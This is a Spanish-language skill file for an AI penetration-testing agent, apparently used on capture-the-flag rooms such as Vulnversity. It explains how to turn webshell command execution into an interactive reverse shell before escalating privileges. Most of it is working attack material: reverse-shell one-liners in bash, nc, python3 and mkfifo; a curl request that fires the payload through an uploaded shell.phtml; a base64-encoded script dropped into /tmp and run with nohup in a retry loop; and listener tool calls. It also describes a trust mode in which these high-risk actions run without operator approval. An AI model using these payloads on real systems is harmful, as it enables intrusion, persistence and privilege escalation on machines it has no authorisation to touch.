---
name: shell-stabilization
description: Estabilizar un RCE de webshell en una shell interactiva real (listener + reverse shell) antes de compilar o escalar privilegios; evita quemar el run ejecutando binarios por curl.
---

# Estabilizar la shell antes de tocar nada más

## La regla de oro

**Si tienes un RCE por webshell (curl), NO intentes compilar código. Abre un
listener con `nexus.post.listener` o `nexus.session.pty` y ejecuta una reverse
shell (bash, nc, python). Trabaja siempre en una shell interactiva real para
escalar privilegios.**

Un webshell es un canal de **un comando por petición**: sin TTY, sin estado, sin
stdin. Todo lo que hagas ahí (compilar, trocear un binario, `sudo` que pide
contraseña, `vim`, `ssh` interactivo) se convierte en una cadena de `curl` que
pierde el 90 % de la salida. Medido en Vulnversity (2026-10-19): el agente ya
tenía `shell.phtml` funcionando, se puso a compilar `pwnkit` y a moverlo en
trozos por `curl`, y gastó **35 turnos** sin escalar. La sala se resuelve con una
reverse shell en 2-3 turnos.

## La decisión, en una línea

```
¿La salida del comando es interactiva (pide contraseña, abre editor, compila,
mantiene un proceso, necesita TTY)?
  SÍ  -> estabiliza primero: listener + reverse shell.
  NO  -> sigue con el webshell (leer un fichero, `id`, `ls`) y registra el hecho.
```

Señales de que ya deberías haber estabilizado:

- llevas 2+ turnos codificando/decodificando (`base64`, trozos, `curl -F`) para
  mover un binario;
- llamas a `gcc`/`make`/`cc` a través de `curl` (y encima el objetivo no tiene
  compilador);
- `sudo -n -l` funciona pero cualquier `sudo` con contraseña falla;
- el objetivo tiene `python3`, `perl`, `nc` o `bash` (compruébalo con un solo
  `which` y para de compilar).

## 1. Prepara el terreno (un solo turno)

```bash
# ¿Con qué puedo lanzar la reverse shell en el objetivo?
curl -s "$U?cmd=which%20bash%20nc%20ncat%20python3%20perl%202%3E%261"
# ¿Cuál es MI IP alcanzable desde el objetivo? (LHOST)
hostname -I; ip -4 addr show tun0 2>/dev/null
```

`U` es la URL del webshell con su parámetro (`...shell.phtml?cmd=`). El `LHOST`
es la interfaz por la que el objetivo te ve (en THM, la `tun0`); nunca `127.0.0.1`.

## 2. Elige el payload

```bash
# bash (el más fiable si existe /bin/bash)
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'

# nc con -e (BusyBox / netcat tradicional)
nc <LHOST> <LPORT> -e /bin/bash

# python3 (sin bash y sin nc -e)
python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# mkfifo (POSIX puro)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f
```

## 3. Abre el listener ANTES de disparar

`nexus.post.listener` es una **captura de un solo tiro**: se queda escuchando
hasta que llega la conexión, envía los `commands` que le pases y devuelve la
transcripción. `nexus.session.pty` es una sesión tmux **persistente**: el
listener sigue vivo entre turnos y puedes `send`/`capture` cuando quieras.

```
# Opción A - persistente (recomendada si el objetivo reintenta o vas a iterar)
nexus.session.pty(action="start", name="rev", cmd="nc -lvnp 4444")
# ...dispara la reverse shell (paso 4)...
nexus.session.pty(action="capture", name="rev", lines=200)
nexus.session.pty(action="send", name="rev", text="id; sudo -n -l")

# Opción B - captura gobernada de un solo tiro
#   1) deja el disparo en bucle en el objetivo (reintenta hasta que escuches):
#      nohup bash -c 'while true; do bash -i >& /dev/tcp/<LHOST>/4444 0>&1; sleep 3; done' &
#   2) y ahora sí, escucha y pide la evidencia en la misma llamada:
nexus.post.listener(port=4444, timeout_seconds=120,
                    commands=["id", "uname -a", "sudo -n -l 2>&1"])
```

Ambas son `HIGH`: en `--trust-mode` (bench) pasan solas; en modo interactivo el
operador las aprueba. Si el sandbox no expone el puerto hacia el objetivo, el
listener no recibirá nada: en ese caso usa `nexus.shell.exec` en el host del
operador (con `&`/`nohup`, que devuelve PID y log) y lee el log con `tail`.

## 4. Dispara la reverse shell desde el webshell

```bash
# URL-encode del payload completo; una sola petición, sin bucles ni ficheros
U='http://<target>/uploads/shell.phtml'
curl -s -G "$U" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"
```

Si el webshell solo acepta `cmd` corto, escribe un script y ejecútalo:

```bash
# 1) crea rev.sh en el workspace (no en el objetivo) con el payload del paso 2
printf '%s\n' '#!/bin/bash' "bash -i >& /dev/tcp/<LHOST>/4444 0>&1" > rev.sh
# 2) si el formulario de subida funciona, súbelo con el mismo truco del webshell
curl -s -F "file=@rev.sh;filename=rev.sh" -F "submit=Upload" http://<target>/<form>/
# 3) o, si el webshell permite escribir, mándalo en base64 (una sola vez, no 20)
B=$(base64 -w0 rev.sh); curl -s -G "$U" --data-urlencode "cmd=echo $B | base64 -d > /tmp/rev.sh; chmod +x /tmp/rev.sh; nohup /tmp/rev.sh >/dev/null 2>&1 &"
```

El patrón `nohup ... &` es importante: sin él el `curl` se queda esperando a que
la shell inversa termine y el turno muere por timeout.

## 5. Convierte la conexión en una shell usable

En cuanto tengas la sesión (pty o listener), pide la evidencia de una vez y
**actualiza el TTY** para que `sudo` y los editores funcionen:

```bash
id; hostname; uname -a; pwd; sudo -n -l 2>&1
python3 -c 'import pty; pty.spawn("/bin/bash")'     # TTY real (si hay python3)
export TERM=xterm; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Con TTY, la escalada es la de siempre (`sudo -l`, SUID, capabilities, cron). Sin
TTY, un `sudo` con contraseña falla aunque la contraseña sea correcta: ese es
exactamente el atasco que esta skill evita.

## 6. Nada de compilar por el webshell

- Si necesitas un binario (linpeas, un exploit, pwnkit), **descárgalo ya
  compilado** o compílalo en tu máquina y súbelo una sola vez; no compiles en el
  objetivo a través de `curl`.
- Si el objetivo no tiene `gcc`/`make`, seguir intentándolo no es enumeración:
  es tiempo perdido. Cambia de vector (SUID, sudo, cron, capabilities, kernel).
- El objetivo de la compilación (si de verdad hace falta) es una shell
  interactiva con el compilador instalado, no 30 peticiones HTTP.

## 7. Registra el acceso y sigue la cadena

- Deja en el tablero el hecho `access` con el canal (`webshell`, `reverse_shell`,
  `session`) y la invocación que lo probó.
- Desde la shell real: `nexus.post.privesc_hints` y el resto de la escalada; el
  webshell queda solo como plan B si la sesión se cae.
- Si la sesión se pierde, reabre el listener y repite el disparo del paso 4; no
  vuelvas a trocear binarios por `curl`.

## Errores comunes

- **Escuchar después de disparar**: la conexión llega, no hay nadie, se pierde.
  Listener primero (o disparo en bucle con `nohup ... &`).
- **`LHOST` equivocado**: `127.0.0.1` o una IP interna del sandbox no es
  alcanzable desde el objetivo; usa la IP del túnel/VPN.
- **`curl` sin `nohup`/`&`**: el turno se queda esperando la shell inversa y
  muere por timeout.
- **Firewall/egress**: si el objetivo no puede salir a tu puerto, prueba 443/80
  (mismo payload) antes de abandonar la reverse shell.
- **Volver al webshell para "una cosita"**: cada comando interactivo que mandes
  por ahí es otro turno perdido; usa la sesión que ya tienes.
